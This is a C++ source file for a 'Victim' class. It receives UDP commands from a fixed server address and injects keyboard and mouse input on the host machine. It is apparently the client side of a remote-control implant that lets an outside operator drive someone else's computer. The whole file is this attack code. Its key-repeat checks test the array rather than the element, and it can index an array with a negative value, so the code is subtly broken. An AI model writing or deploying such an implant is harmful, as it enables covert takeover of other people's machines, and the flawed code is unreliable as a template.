#include "victim.h"

Victim::Victim(sf::UdpSocket* s)
    :
    socket(s)
{
    for (int i = 0; i < 256; i++) {
        keysStates[i] = false;
        isRepeating[i] = false;
        keysTimes[i] = Mlib::getTime();
    }
}

void Victim::repeatKeys()
{
    while (true)
    {
        for (int i = 0; i < 256; i++)
        {
            if (keysStates[i] && i != 0x01 && i != 0x02 && i != 0x04 && i != 0x05 && i != 0x06) {
                if (Mlib::getTime() - keysTimes[i] > 500 && !isRepeating) {
                    isRepeating[i] = true;
                    keysTimes[i] = Mlib::getTime();
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), true);
                }
                else if (isRepeating && Mlib::getTime() - keysTimes[i] > 30) {
                    keysTimes[i] = Mlib::getTime();
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), true);
                }
            }
        }
        Mlib::sleep(1);
    }
}

int Victim::controlVictim()
{
    while (true)
    {
        size_t size;
        sf::IpAddress ip;
        unsigned short port;
        char msg[6];
        socket->receive(msg, sizeof(msg), size, ip, port);

        if (ip != SERVER_IP || port != SERVER_PORT)
            continue;

        //exit program
        if (msg[0] == 'e') {
            return 0;
        }
        //key pressed
        else if (msg[0] == 'n') {
            int vkc = int(msg[1]);
            keysStates[vkc] = true;
            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), true);
            else {
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), true);
                keysTimes[vkc] = Mlib::getTime();
            }
        }
        //key released
        else if (msg[0] == 'm') {
            int vkc = int(msg[1]);
            keysStates[vkc] = false;
            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
            else {
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
                isRepeating[vkc] = false;
            }
        }
    }

    return -1;
}
